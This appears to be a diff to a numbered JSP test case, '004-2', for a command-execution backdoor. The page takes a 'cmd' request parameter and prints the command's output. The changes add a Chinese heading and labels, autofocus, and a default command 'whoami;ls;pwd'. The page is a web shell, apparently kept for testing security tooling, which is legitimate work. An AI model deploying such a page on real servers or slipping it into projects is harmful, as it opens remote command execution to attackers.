@@ -8,6 +8,7 @@
     <title>004-2 命令执行，带回显</title>
 </head>
 <body>
+    <h1>004 - 命令执行后门（有回显）</h1>
 <%
 String output = "";
 String cmd    = request.getParameter ("cmd");
@@ -36,12 +37,15 @@ if (cmd != null)
             out.print(e);
         }
     }
+} else {
+    cmd = "whoami;ls;pwd";
 }
 %>
-<div>
+<div>    
+
 <form method=POST>
-<label>Command</label>
-<input name=cmd style="width: 100%" value="<%=cmd %>"></input>
+<label>输入要执行的命令，敲回车即可</label>
+<input name=cmd style="width: 100%" autofocus value="<%=cmd %>"></input>
 </form>
 <pre>
 <%=output %>
